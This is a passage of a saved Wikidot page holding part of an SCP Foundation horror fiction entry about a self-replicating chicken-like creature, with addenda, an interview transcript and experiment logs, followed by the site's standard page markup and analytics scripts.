<p><strong>ADDENDUM 31338-A-02:</strong> On █/█/2017, a thorough sweep of SCP-31338's initial recovery location was enacted in an attempt to uncover the creature's origin and purpose. Local reports suggested that the small remote residence in question had been abandoned for at least two decades. Surface Team Delta-029-E recovered several items of interest, including:</p>
<ul>
<li>One bag of assorted thread and needles, in various colors and sizes.</li>
<li>Approximately thirteen chicken carcasses (based on the collective halves and quarters), with precise incisions located on the underbelly, neck, and thigh. Six of the carcasses had been plucked, with visible human teeth marks lining the bare areas at random intervals.</li>
<li>Several containers, including water bottles and Tupperware boxes, holding an unidentified watery paste. The paste was a deep brown in color, and in the presence of oxygen it turned viscous and hard.</li>
<li>An A5 notebook, ████ brand, and heavily scratched with what was determined to be human fingernails. The words 'NEW BREED MANIFESTO' are written on the front cover.</li>
<li>Two chicken feather quills.</li>
</ul>
<p>The notebook itself consisted of 24 pages of standard lined paper, written in non-anomalous black ink. 19 of these pages consisted of various cuboid patterns and crude, child-like illustrations vaguely resembling SCP-31338. On the remaining five pages, large lines of writing detail the diary of an unnamed individual. Much of the written script was illegible. One extract in particular, dated ██/6/1973 was written with notably higher clarity:</p>
<blockquote>
<p>If you're reading this, then <span style="text-decoration: line-through;">luky</span> lucky you! fore hunndreth thousand hour from notw and itll be warm and wet and warm, and the wonderful <span style="text-decoration: line-through;">vursatilli</span> <span style="text-decoration: line-through;">vessa</span> versatility of (INFERIOR) human DNA will birth a be tter era. A stronger ear. One where [ILLEGIBLE] and food and water will be nothing but things of the passed as we make and make and make more <span style="text-decoration: line-through;">until</span> until [ILLEGIBLE]<br>
I REALLY HAVEN'T MUCH <span style="text-decoration: line-through;">TIM</span><br>
TIME<br>
THATS why i ENVY you <span style="text-decoration: line-through;">so</span> <span style="text-decoration: line-through;">so</span> so much. you'll have all the time you need. time will be <span style="text-decoration: line-through;">a thing of the</span> time will be on and on and death will be life. <span style="text-decoration: line-through;">life</span> new life needs things to live. new life will be a part of life from now on. (sic)</p>
</blockquote>
<p>The final page consisted of various ink blots, thirteen instances of the word 'life' in inconsistent sizes, two instances of the words 'want it want i want it' (sic), and the lyrics to English songwriter Frederic Weatherly's 'Danny Boy' in Old Gaelic script. The identity of the journal's author is pending investigation.</p>
<p><strong>ADDENDUM 31338-03:</strong> <em>Protocol 34-22-B</em></p>
<p>The following procedure is to occur in the event of a Site-114 containment breach, in an effort to safely and immediately re-contain live SCP-31338 instances.</p>
<p>On-site personnel with Level-1 security clearance or above assume standard lock-down procedure and evacuate to Site-113 to await further instruction. Site-114 is to be flooded in its entirety by a clean, distilled water treated with dissolvable Class A sedatives. Surface Team Tango-306-A will be dispatched immediately to retrieve any lingering instances of SCP-31338's eggs. Any living instances of SCP-31338 will be terminated on sight, and their remaining eggs will be collected. All egg samples are to be transported to temporary off-site containment within a stable water bath. Site-114 will be subsequently drained, and custodian staff will be dispatched to thoroughly clean and sanitize the grounds to a 'green zone' Foundation standard.</p>
<p>Personnel attempting to breach Site-114 before this inspection is complete will be apprehended and punished accordingly.</p>
<blockquote>
<p><em>Note: A number of personnel have expressed their skepticism regarding the scale of SCP-31338's containment breach protocol. To clarify, we have reason to believe that fluid is an excellent counter to SCP-31338's anomalous reproductive properties. It appears to enter an inert state in the presence of liquid, regardless of thickness or clarity. The leading theory is as follows: SCP-31338 discerns the liquid around it to be 'occupied space'.</em></p>
<p><em>Regardless, I believe I speak for all of Site-114 when I say we're quite relieved to have found a safe and consistent method of containment.</em></p>
<p><em>Dr. Lewis, 12/5/2017</em></p>
</blockquote>
<p><strong>INTERVIEW 31338-I-01:</strong></p>
<div class="collapsible-block">
<div class="collapsible-block-folded"><a class="collapsible-block-link" href="javascript:;">+&nbsp;VIDEO&nbsp;TRANSCRIPT</a></div>
<div class="collapsible-block-unfolded" style="display:none">
<div class="collapsible-block-unfolded-link"><a class="collapsible-block-link" href="javascript:;">-&nbsp;HIDE&nbsp;VIDEO&nbsp;TRANSCRIPT</a></div>
<div class="collapsible-block-content">
<blockquote>
<p style="text-align: center;"><strong>VIDEO TRANSCRIPT</strong></p>
<hr>
<p><strong>DATE:</strong> 10/28/2017<br>
<strong>SUBJECT:</strong> Cpl. Duncan<br>
<strong>INTERVIEWER:</strong> Dr. Ewing<br>
<strong>FOREWORD:</strong> Subject had undergone extensive psychiatric therapy prior to interview, and while the Foundation does not consider them responsible for the deaths of Pvt. MacLeod and Pvt. Langley, subject expressed feelings of guilt for having neglected standard Foundation health &amp; safety protocol.</p>
<hr>
<p>[BEGIN LOG]</p>
<p><strong>DUNCAN:</strong> Take a seat, right?</p>
<p><strong>EWING:</strong> Please, if you would.</p>
<p><em>Cpl. Duncan clears his throat. White noise as he sits, visibly anxious.</em></p>
<p><strong>EWING:</strong> Could you explain your mission briefing?</p>
<p><strong>DUNCAN:</strong> The job was pretty simple. No auditory or visual triggers that the higher-ups in Site-114 knew about. Seems to me as if they'd done a pretty top job scraping the area clean.</p>
<p><em>Cpl. Duncan laughs nervously.</em></p>
<p><strong>DUNCAN:</strong> Never is that easy though, huh ma'am? We landed around 2100 hours. The boys and I had been told that if we couldn't catch the thing, the next best thing would be snapping a frame or two, so they- uh- they hooked us up with the best in night vision hardware.</p>
<p><em>Cpl. Duncan shuffles uncomfortably in his seat.</em></p>
<p><strong>DUNCAN:</strong> … I know you have pictures, Ela. I know you've got <em>something.</em></p>
<p><em>Paper shuffling. Dr. Ewing looks grave.</em></p>
<p><strong>EWING:</strong> You're under no obligation to view the recording.</p>
<p><strong>DUNCAN:</strong> Nah, nah- I- I know that. Just shook me a little.</p>
<p><strong>EWING:</strong> Please. Go on.</p>
<p><strong>DUNCAN:</strong> (<em>Shivering.</em>) We found something within the hour- almost like a shack, totally out of scrap metal and wood. Looked more like an over-sized chicken coop than anything else, but I don't know that your new monster built it. Just made it a home.</p>
<p><strong>EWING:</strong> And I assume you-</p>
<p><strong>DUNCAN:</strong> - entered ASAP? Of course, it was a late shift. Wanted this over as quick as possible. I'd like to say that's why I did what I did, but- uh- I can't bring myself to make excuses.</p>
<p><em>Cpl. Duncan places his head in his hands, sighing.</em></p>
<p><strong>DUNCAN:</strong> I really- really fucked it, ma'am. Pardon my French.</p>
<p><strong>EWING:</strong> It's perfectly appropriate, all things considered. However, I'm going to have to ask you to continue explaining the procedure.</p>
<p><strong>DUNCAN:</strong> Right, right, well- I had two of my men stationed at back. Pvt. MacLeod and Pvt. Langley insisted they take first charge. Fresh out of training, they were. Kids. I should be used to it by now, but-</p>
<p><em>Cpl. Duncan laughs dryly.</em></p>
<p><strong>DUNCAN:</strong> Never seen a smile get cut down so quick. It knew we were there, somehow. Jumped right at Pvt. MacLeod and [DATA EXPUNGED] the fuckin' teeth out of his head. I see it whenever I blink, ma'am. That's the shit that stays with you.</p>
<p><strong>EWING:</strong> The Foundation will take every measure in providing financial compensation to the families of your lost men. Could you elaborate upon the other casualty?</p>
<p><em>Silence for a moment. Cpl Duncan leans back in his chair. A pause.</em></p>
<p><strong>EWING:</strong> Duncan? Please, I must urge you to continue. The more we know, the more we can do to stop it from happening again.</p>
<p><strong>DUNCAN:</strong> (Eventually) We barely had time to react before it started moving down the corridor to the right. I guess the adrenaline had just about hit me, because I fired off enough rounds to blow a chunk out of its chest, just as its ugly head was about to round a corner. I saw-</p>
<p><em>Another pause. Cpl. Duncan shows visible signs of distress.</em></p>
<p><strong>DUNCAN:</strong> I saw straight fuckin' moonlight on the other side. Bulls-eye. Thing let out the most awful scream. I have a beautiful little baby boy at home, doc. You know that?</p>
<p><strong>EWING:</strong> Irrelevant discussion of domestic life isn't necessary for this procedure, Corporal. Could you please-</p>
<p><strong>DUNCAN:</strong> (<em>Raising voice.</em>) I have a beautiful baby boy who just loves wailin' when he's too cranky to sleep, and you know what? Every time he does, I think about that scream. I see it in my head. Think what it did- and his pa gives him a look as if he's gonna bash his fuckin' head against the wall.</p>
<p><em>Cpl. Duncan, now standing, gradually sits back down.</em></p>
<p><strong>DUNCAN:</strong> (<em>Strained</em>) They were good men.</p>
<p><em>Silence.</em></p>
<p><strong>DUNCAN:</strong> Please, Ela. Kill that monster. If for no one else, for me.</p>
<p>[END LOG]</p>
</blockquote>
<blockquote>
<p><em>Note: I extend my strongest condolences to the families of those lost during SCP-31338’s initial recovery. Furthermore, I would like to formally request that Cpl. Duncan is administered one Class B amnestic at the earliest possible convenience. No excuses.</em></p>
<p><em>Dr. E. Ewing, Site-114 Director</em></p>
</blockquote>
</div>
</div>
</div>
<p><strong>ADDENDUM 31338-04:</strong> <em>Experiment Logs</em></p>
<p><strong>EXPERIMENT 31338-E-01</strong> - 'Heat Exposure' - █/█/2017</p>
<p><strong>Subject:</strong> One egg sample from SCP-31338.</p>
<p><strong>Method:</strong> Subject relocated to a secure containment cell. Inside temperature of the cell was gradually increased at an average rate of 7°C/minute.</p>
<p><strong>Results:</strong> After approx. nine minutes, the egg ruptured violently and produced a single hatchling. On-site personnel reacted swiftly to re-contain the newborn instance. However, the excessive internal temperature appears to have impacted the physical maturity of the hatchling, and it reached adolescence at an accelerated rate of 40 seconds.</p>
<p>The (now adolescent) hatchling produced two further instances of SCP-31338. Security response on-site was swift, and all three instances were detained cleanly. All subsequent heat experiments involving SCP-31338's eggs have been postponed until further notice.</p>
<p><strong>EXPERIMENT 31338-E-02</strong> - 'Cold Exposure' - █/█/2017</p>
<p><strong>Subject:</strong> One egg sample from SCP-31338.</p>
<p><strong>Method:</strong> Subject submerged entirely in liquid nitrogen. Security remain on standby throughout the procedure, in light of prior experiments. After approximately 45 minutes of exposure, SCP-31338 had reached -190°C. Following two hours of exposure, the egg was removed and placed under a hydraulic press.</p>
<p><strong>Results:</strong> Hydraulic press peaked at pressures of around 9,000 psi. Cracks appeared approximately 30 minutes into exposure before the sample shattered. Egg fragments were collected and furthermore pressed into a fine pulp. Zero traces of albumen or yolk were located. Complete incineration of the shell's remains proved successful in destroying the egg and its reproductive capabilities entirely.</p>
<p><strong>EXPERIMENT 31338-E-03</strong> - 'Chemical Analysis of Shell' - ██/█/2017</p>
<p><strong>Sample:</strong> Ten grams of finely pressed eggshell pulp, taken from an SCP-31338 egg.</p>
<p><strong>Results:</strong> Detailed chemical breakdown shows traces of nacre, enamel, and a currently unidentified carbon compound. Microscope analysis suggests that the shell itself is composed of a tightly packed crystalline structure. Practical application of this material is pending administrative approval.</p>
<div class="footnotes-footer">
<div class="title">Footnotes</div>
<div class="footnote-footer" id="footnote-1"><a href="javascript:;" onclick="WIKIDOT.page.utils.scrollToReference('footnoteref-1')">1</a>. <em>Gallus gallus domesticus.</em></div>
<div class="footnote-footer" id="footnote-2"><a href="javascript:;" onclick="WIKIDOT.page.utils.scrollToReference('footnoteref-2')">2</a>. <em>Pan troglodytes.</em></div>
<div class="footnote-footer" id="footnote-3"><a href="javascript:;" onclick="WIKIDOT.page.utils.scrollToReference('footnoteref-3')">3</a>. <em>Mustela erminea.</em></div>
<div class="footnote-footer" id="footnote-4"><a href="javascript:;" onclick="WIKIDOT.page.utils.scrollToReference('footnoteref-4')">4</a>. <em>Margaritifera margaritifera</em></div>
<div class="footnote-footer" id="footnote-5"><a href="javascript:;" onclick="WIKIDOT.page.utils.scrollToReference('footnoteref-5')">5</a>. <em>Vipera berus.</em></div>
</div>
<div class="footer-wikiwalk-nav">
<div style="text-align: center;">
<p>« <a href="/scp-3198">SCP-3198</a> | SCP-31338 | <a href="/scp-3200">SCP-3200</a> »</p>
</div>
</div>

                    </div>

                            
            <!-- wikidot_bottom_300x250 -->
<div id="wad-scp-wiki-below-content" class="wd-adunit wd-ad-np wd-adunit-below_content"></div>
<script type="text/javascript">
nads.createAd('wad-scp-wiki-below-content', {
  "refreshLimit": 10,
  "refreshTime": 83,
  "sizes": [ [ 300, 250 ] ],
  "report": {
    "enabled": true,
    "wording": "Report Ad",
    "position": "bottom-right"
  }
  });
</script>
        
    

                    



                    
                        <div class="page-tags">
                            <span>
                                <a href="/system:page-tags/tag/_cc#pages">_cc</a><a href="/system:page-tags/tag/biological#pages">biological</a><a href="/system:page-tags/tag/humanoid#pages">humanoid</a><a href="/system:page-tags/tag/k-class-scenario#pages">k-class-scenario</a><a href="/system:page-tags/tag/keter#pages">keter</a><a href="/system:page-tags/tag/predatory#pages">predatory</a><a href="/system:page-tags/tag/scp#pages">scp</a><a href="/system:page-tags/tag/self-replicating#pages">self-replicating</a><a href="/system:page-tags/tag/sentient#pages">sentient</a><a href="/system:page-tags/tag/species#pages">species</a>
                            </span>
                        </div>
                    

                    <div id="page-info-break"></div>
                    
                        <div id="page-options-container">
                            <div id="page-info">page revision: 58, last edited: <span class="odate time_1629751383 format_%25e%20%25b%20%25Y%2C%20%25H%3A%25M%20%28%25O%20ago%29" style="display: inline;">23 Aug 2021, 22:43 (19 days ago)</span></div>
            <div id="page-options-bottom" class="page-options-bottom">
            <a href="javascript:;" class="btn btn-default" id="edit-button">Edit</a>
<a href="javascript:;" class="btn btn-default" id="pagerate-button">Rate (<span id="prw54355">+797</span>)</a>
<a href="javascript:;" class="btn btn-default" id="tags-button">Tags</a>
<a href="/forum/t-2291359/scp-31338" class="btn btn-default" id="discuss-button">Discuss (110)</a>
<a href="javascript:;" class="btn btn-default" id="history-button">History</a>
<a href="javascript:;" class="btn btn-default" id="files-button">Files</a>
<a href="javascript:;" class="btn btn-default" id="print-button">Print</a>
<a href="javascript:;" class="btn btn-default" id="site-tools-button">Site tools</a>
<a href="javascript:;" class="btn btn-default" id="more-options-button">+&nbsp;Options</a> 
</div>
<div id="page-options-bottom-2" class="page-options-bottom form-actions" style="display:none">
    <a href="javascript:;" class="btn btn-default" id="edit-sections-button">Edit Sections</a>
    <a href="javascript:;" class="btn btn-default" id="edit-append-button">Append</a>
    <a href="javascript:;" class="btn btn-default" id="edit-meta-button">Edit Meta</a>
    <a href="javascript:;" class="btn btn-default" id="watchers-button">Watchers</a> 
    <a href="javascript:;" class="btn btn-default" id="backlinks-button">Backlinks</a> 
    <a href="javascript:;" class="btn btn-default" id="view-source-button">Page Source</a> 
    <a href="javascript:;" class="btn btn-default" id="parent-page-button">Parent</a> 
    <a href="javascript:;" class="btn btn-default" id="page-block-button">Lock Page</a>    
    <a href="javascript:;" class="btn btn-default" id="rename-move-button">Rename</a> 
    <a href="javascript:;" class="btn btn-default" id="delete-button">Delete</a> 
</div>
<div id="page-options-area-bottom">
</div>

                        </div>
                    
                    <div id="action-area" style="display: none;"></div>
                </div>
            </div>
            
            
            
            <div id="footer" style="display: block; visibility: visible;">
                <div class="options" style="display: block; visibility: visible;">
    <a href="http://www.wikidot.com/doc" id="wikidot-help-button">Help</a>
    &nbsp;|
    <a href="http://www.wikidot.com/legal:terms-of-service" id="wikidot-tos-button">Terms of Service</a>
    &nbsp;|
    <a href="http://www.wikidot.com/legal:privacy-policy" id="wikidot-privacy-button">Privacy</a>
    &nbsp;|
    <a href="javascript:;" id="bug-report-button" onclick="WIKIDOT.page.listeners.pageBugReport(event)">Report a bug</a>
    &nbsp;|
    <a href="javascript:;" id="abuse-report-button" onclick="WIKIDOT.page.listeners.flagPageObjectionable(event)">Flag as objectionable</a>
</div>
Powered by <a href="http://www.wikidot.com">Wikidot.com</a> 
            </div>
            
                <div id="license-area" class="license-area">
                    Unless otherwise stated, the content of this page is licensed under <a rel="license" href="http://creativecommons.org/licenses/by-sa/3.0/">Creative Commons Attribution-ShareAlike 3.0 License</a>
                </div>
            
            
            



            <div id="extrac-div-1"><span></span></div><div id="extrac-div-2"><span></span></div><div id="extrac-div-3"><span></span></div>
            
            
            
            
                <div id="footer-bar">
  <div>
     </div>
  <h2>Other interesting sites</h2>
  
  <div class="units">
              <div class="unit">
          <div class="inner">
            <a target="_blank" class="image" href="http://wfh.wikidot.com">
              <img class="thumbnail" alt="" src="https://thumbnails.wdfiles.com/thumbnail/site/wfh.wikidot.com/80.jpg">
            </a>
            <h3><a target="_blank" href="http://wfh.wikidot.com">Women's Film History Network</a></h3>
            <div class="desc">          
              
            </div>
          </div>
        </div>
              <div class="unit">
          <div class="inner">
            <a target="_blank" class="image" href="http://blmodding.wikidot.com">
              <img class="thumbnail" alt="" src="https://thumbnails.wdfiles.com/thumbnail/site/blmodding.wikidot.com/80.jpg">
            </a>
            <h3><a target="_blank" href="http://blmodding.wikidot.com">Borderlands Modding Resource</a></h3>
            <div class="desc">          
              
            </div>
          </div>
        </div>
              <div class="unit">
          <div class="inner">
            <a target="_blank" class="image" href="http://vyprmedia.wikidot.com">
              <img class="thumbnail" alt="" src="https://thumbnails.wdfiles.com/thumbnail/site/vyprmedia.wikidot.com/80.jpg">
            </a>
            <h3><a target="_blank" href="http://vyprmedia.wikidot.com">VyprMedia</a></h3>
            <div class="desc">          
              
            </div>
          </div>
        </div>
              <div class="unit">
          <div class="inner">
            <a target="_blank" class="image" href="http://morningsidemicro.wikidot.com">
              <img class="thumbnail" alt="" src="https://thumbnails.wdfiles.com/thumbnail/site/morningsidemicro.wikidot.com/80.jpg">
            </a>
            <h3><a target="_blank" href="http://morningsidemicro.wikidot.com">Microbiology@Morningside</a></h3>
            <div class="desc">          
              The wiki for students in BIO 252 at Morningside
            </div>
          </div>
        </div>
        </div>
  </div>

            
        </div>
        
    </div>
<!-- These extra divs/spans may be used as catch-alls to add extra imagery. -->
<div id="extra-div-1"><span></span></div><div id="extra-div-2"><span></span></div><div id="extra-div-3"><span></span></div>
<div id="extra-div-4"><span></span></div><div id="extra-div-5"><span></span></div><div id="extra-div-6"><span></span></div>
</div>




</div>
<div id="dummy-ondomready-block" style="display: none;"></div>
    <!-- Google Analytics load -->
    <script type="text/javascript">
        (function() {
            var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
            ga.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'stats.g.doubleclick.net/dc.js';
            var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
        })();
    </script>

    <!-- Quantcast -->
    <script type="text/javascript">
    _qoptions={
        qacct:"p-edL3gsnUjJzw-"
    };
    (function() {
        var qc = document.createElement('script'); qc.type = 'text/javascript'; qc.async = true;
        qc.src = ('https:' == document.location.protocol ? 'https://secure' : 'http://edge') + '.quantserve.com/quant.js';
        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(qc, s);
    })();
    </script>
    <noscript>
        <img src="http://pixel.quantserve.com/pixel/p-edL3gsnUjJzw-.gif" style="display: none;" border="0" height="1" width="1" alt="Quantcast"/>
    </noscript>




<div id="page-options-bottom-tips" style="display: none;">
    
</div>
<div id="page-options-bottom-2-tips" style="display: none;">
    
    
    
    
    
    
    
    
    
    
            
        
        
        
        
    </div>

<div id="odialog-hovertips" style="position: absolute; z-index: 100; top: 0px; width: 100%;"><div id="edit-button-hovertip" class="hovertip " style="position: absolute; display: none; border: 1px solid black; --darkreader-inline-border-top:#8c8273; --darkreader-inline-border-right:#8c8273; --darkreader-inline-border-bottom:#8c8273; --darkreader-inline-border-left:#8c8273; left: 729px; top: 3861px;" data-darkreader-inline-border-top="" data-darkreader-inline-border-right="" data-darkreader-inline-border-bottom="" data-darkreader-inline-border-left=""><div class="content">
        Click here to edit contents of this page.    </div></div><div id="edit-sections-button-hovertip" class="hovertip " style="position: absolute; display: none; border: 1px solid black; --darkreader-inline-border-top:#8c8273; --darkreader-inline-border-right:#8c8273; --darkreader-inline-border-bottom:#8c8273; --darkreader-inline-border-left:#8c8273;" data-darkreader-inline-border-top="" data-darkreader-inline-border-right="" data-darkreader-inline-border-bottom="" data-darkreader-inline-border-left=""><div class="content">
        Click here to toggle editing of individual sections of the page (if possible).         Watch headings for an "edit" link when available.    </div></div><div id="edit-append-button-hovertip" class="hovertip " style="position: absolute; display: none; border: 1px solid black; --darkreader-inline-border-top:#8c8273; --darkreader-inline-border-right:#8c8273; --darkreader-inline-border-bottom:#8c8273; --darkreader-inline-border-left:#8c8273;" data-darkreader-inline-border-top="" data-darkreader-inline-border-right="" data-darkreader-inline-border-bottom="" data-darkreader-inline-border-left=""><div class="content">
        Append content without editing the whole page source.    </div></div><div id="history-button-hovertip" class="hovertip " style="position: absolute; display: none; border: 1px solid black; --darkreader-inline-border-top:#8c8273; --darkreader-inline-border-right:#8c8273; --darkreader-inline-border-bottom:#8c8273; --darkreader-inline-border-left:#8c8273;" data-darkreader-inline-border-top="" data-darkreader-inline-border-right="" data-darkreader-inline-border-bottom="" data-darkreader-inline-border-left=""><div class="content">
        Check out how this page has evolved in the past.    </div></div><div id="discuss-button-hovertip" class="hovertip " style="position: absolute; display: none; border: 1px solid black; --darkreader-inline-border-top:#8c8273; --darkreader-inline-border-right:#8c8273; --darkreader-inline-border-bottom:#8c8273; --darkreader-inline-border-left:#8c8273;" data-darkreader-inline-border-top="" data-darkreader-inline-border-right="" data-darkreader-inline-border-bottom="" data-darkreader-inline-border-left=""><div class="content">
        If you want to discuss contents of this page - this is the easiest way to do it.    </div></div><div id="files-button-hovertip" class="hovertip " style="position: absolute; display: none; border: 1px solid black; --darkreader-inline-border-top:#8c8273; --darkreader-inline-border-right:#8c8273; --darkreader-inline-border-bottom:#8c8273; --darkreader-inline-border-left:#8c8273;" data-darkreader-inline-border-top="" data-darkreader-inline-border-right="" data-darkreader-inline-border-bottom="" data-darkreader-inline-border-left=""><div class="content">
        View and manage file attachments for this page.    </div></div><div id="site-tools-button-hovertip" class="hovertip " style="position: absolute; display: none; border: 1px solid black; --darkreader-inline-border-top:#8c8273; --darkreader-inline-border-right:#8c8273; --darkreader-inline-border-bottom:#8c8273; --darkreader-inline-border-left:#8c8273;" data-darkreader-inline-border-top="" data-darkreader-inline-border-right="" data-darkreader-inline-border-bottom="" data-darkreader-inline-border-left=""><div class="content">
        A few useful tools to manage this Site.    </div></div><div id="backlinks-button-hovertip" class="hovertip " style="position: absolute; display: none; border: 1px solid black; --darkreader-inline-border-top:#8c8273; --darkreader-inline-border-right:#8c8273; --darkreader-inline-border-bottom:#8c8273; --darkreader-inline-border-left:#8c8273;" data-darkreader-inline-border-top="" data-darkreader-inline-border-right="" data-darkreader-inline-border-bottom="" data-darkreader-inline-border-left=""><div class="content">
        See pages that link to and include this page.    </div></div><div id="rename-move-button-hovertip" class="hovertip " style="position: absolute; display: none; border: 1px solid black; --darkreader-inline-border-top:#8c8273; --darkreader-inline-border-right:#8c8273; --darkreader-inline-border-bottom:#8c8273; --darkreader-inline-border-left:#8c8273;" data-darkreader-inline-border-top="" data-darkreader-inline-border-right="" data-darkreader-inline-border-bottom="" data-darkreader-inline-border-left=""><div class="content">
        Change the name (also URL address, possibly the category) of the page.    </div></div><div id="view-source-button-hovertip" class="hovertip " style="position: absolute; display: none; border: 1px solid black; --darkreader-inline-border-top:#8c8273; --darkreader-inline-border-right:#8c8273; --darkreader-inline-border-bottom:#8c8273; --darkreader-inline-border-left:#8c8273;" data-darkreader-inline-border-top="" data-darkreader-inline-border-right="" data-darkreader-inline-border-bottom="" data-darkreader-inline-border-left=""><div class="content">
        View wiki source for this page without editing.    </div></div><div id="parent-page-button-hovertip" class="hovertip " style="position: absolute; display: none; border: 1px solid black; --darkreader-inline-border-top:#8c8273; --darkreader-inline-border-right:#8c8273; --darkreader-inline-border-bottom:#8c8273; --darkreader-inline-border-left:#8c8273;" data-darkreader-inline-border-top="" data-darkreader-inline-border-right="" data-darkreader-inline-border-bottom="" data-darkreader-inline-border-left=""><div class="content">  
        View/set parent page (used for creating breadcrumbs and structured layout).    </div></div><div id="abuse-report-button-hovertip" class="hovertip " style="position: absolute; display: none; border: 1px solid black; --darkreader-inline-border-top:#8c8273; --darkreader-inline-border-right:#8c8273; --darkreader-inline-border-bottom:#8c8273; --darkreader-inline-border-left:#8c8273;" data-darkreader-inline-border-top="" data-darkreader-inline-border-right="" data-darkreader-inline-border-bottom="" data-darkreader-inline-border-left=""><div class="content">
            Notify administrators if there is objectionable content in this page.        </div></div><div id="bug-report-button-hovertip" class="hovertip " style="position: absolute; display: none; border: 1px solid black; --darkreader-inline-border-top:#8c8273; --darkreader-inline-border-right:#8c8273; --darkreader-inline-border-bottom:#8c8273; --darkreader-inline-border-left:#8c8273;" data-darkreader-inline-border-top="" data-darkreader-inline-border-right="" data-darkreader-inline-border-bottom="" data-darkreader-inline-border-left=""><div class="content">
            Something does not work as expected? Find out what you can do.        </div></div><div id="wikidot-help-button-hovertip" class="hovertip " style="position: absolute; display: none; border: 1px solid black; --darkreader-inline-border-top:#8c8273; --darkreader-inline-border-right:#8c8273; --darkreader-inline-border-bottom:#8c8273; --darkreader-inline-border-left:#8c8273;" data-darkreader-inline-border-top="" data-darkreader-inline-border-right="" data-darkreader-inline-border-bottom="" data-darkreader-inline-border-left=""><div class="content">
            General Wikidot.com documentation and help section.        </div></div><div id="wikidot-tos-button-hovertip" class="hovertip " style="position: absolute; display: none; border: 1px solid black; --darkreader-inline-border-top:#8c8273; --darkreader-inline-border-right:#8c8273; --darkreader-inline-border-bottom:#8c8273; --darkreader-inline-border-left:#8c8273;" data-darkreader-inline-border-top="" data-darkreader-inline-border-right="" data-darkreader-inline-border-bottom="" data-darkreader-inline-border-left=""><div class="content">
            Wikidot.com Terms of Service - what you can, what you should not etc.        </div></div><div id="wikidot-privacy-button-hovertip" class="hovertip " style="position: absolute; display: none; border: 1px solid black; --darkreader-inline-border-top:#8c8273; --darkreader-inline-border-right:#8c8273; --darkreader-inline-border-bottom:#8c8273; --darkreader-inline-border-left:#8c8273;" data-darkreader-inline-border-top="" data-darkreader-inline-border-right="" data-darkreader-inline-border-bottom="" data-darkreader-inline-border-left=""><div class="content">
            Wikidot.com Privacy Policy.          
        </div></div><div class="hovertip " style="width: auto; background-color: white; position: absolute; display: none; border: 1px solid black; --darkreader-inline-bgcolor:#181a1b; --darkreader-inline-border-top:#8c8273; --darkreader-inline-border-right:#8c8273; --darkreader-inline-border-bottom:#8c8273; --darkreader-inline-border-left:#8c8273;" data-darkreader-inline-bgcolor="" data-darkreader-inline-border-top="" data-darkreader-inline-border-right="" data-darkreader-inline-border-bottom="" data-darkreader-inline-border-left=""><div class="content"><div class="footnote"><div class="f-heading">Footnote 1.</div><div class="f-content"><em>Gallus gallus domesticus.</em></div><div class="f-footer">(click to scroll to footnotes)</div></div></div></div><div class="hovertip " style="width: auto; background-color: white; position: absolute; display: none; border: 1px solid black; --darkreader-inline-bgcolor:#181a1b; --darkreader-inline-border-top:#8c8273; --darkreader-inline-border-right:#8c8273; --darkreader-inline-border-bottom:#8c8273; --darkreader-inline-border-left:#8c8273;" data-darkreader-inline-bgcolor="" data-darkreader-inline-border-top="" data-darkreader-inline-border-right="" data-darkreader-inline-border-bottom="" data-darkreader-inline-border-left=""><div class="content"><div class="footnote"><div class="f-heading">Footnote 2.</div><div class="f-content"><em>Pan troglodytes.</em></div><div class="f-footer">(click to scroll to footnotes)</div></div></div></div><div class="hovertip " style="width: auto; background-color: white; position: absolute; display: none; border: 1px solid black; --darkreader-inline-bgcolor:#181a1b; --darkreader-inline-border-top:#8c8273; --darkreader-inline-border-right:#8c8273; --darkreader-inline-border-bottom:#8c8273; --darkreader-inline-border-left:#8c8273;" data-darkreader-inline-bgcolor="" data-darkreader-inline-border-top="" data-darkreader-inline-border-right="" data-darkreader-inline-border-bottom="" data-darkreader-inline-border-left=""><div class="content"><div class="footnote"><div class="f-heading">Footnote 3.</div><div class="f-content"><em>Mustela erminea.</em></div><div class="f-footer">(click to scroll to footnotes)</div></div></div></div><div class="hovertip " style="width: auto; background-color: white; position: absolute; display: none; border: 1px solid black; --darkreader-inline-bgcolor:#181a1b; --darkreader-inline-border-top:#8c8273; --darkreader-inline-border-right:#8c8273; --darkreader-inline-border-bottom:#8c8273; --darkreader-inline-border-left:#8c8273;" data-darkreader-inline-bgcolor="" data-darkreader-inline-border-top="" data-darkreader-inline-border-right="" data-darkreader-inline-border-bottom="" data-darkreader-inline-border-left=""><div class="content"><div class="footnote"><div class="f-heading">Footnote 4.</div><div class="f-content"><em>Margaritifera margaritifera</em></div><div class="f-footer">(click to scroll to footnotes)</div></div></div></div><div class="hovertip " style="width: auto; background-color: white; position: absolute; display: none; border: 1px solid black; --darkreader-inline-bgcolor:#181a1b; --darkreader-inline-border-top:#8c8273; --darkreader-inline-border-right:#8c8273; --darkreader-inline-border-bottom:#8c8273; --darkreader-inline-border-left:#8c8273;" data-darkreader-inline-bgcolor="" data-darkreader-inline-border-top="" data-darkreader-inline-border-right="" data-darkreader-inline-border-bottom="" data-darkreader-inline-border-left=""><div class="content"><div class="footnote"><div class="f-heading">Footnote 5.</div><div class="f-content"><em>Vipera berus.</em></div><div class="f-footer">(click to scroll to footnotes)</div></div></div></div></div></body></html>





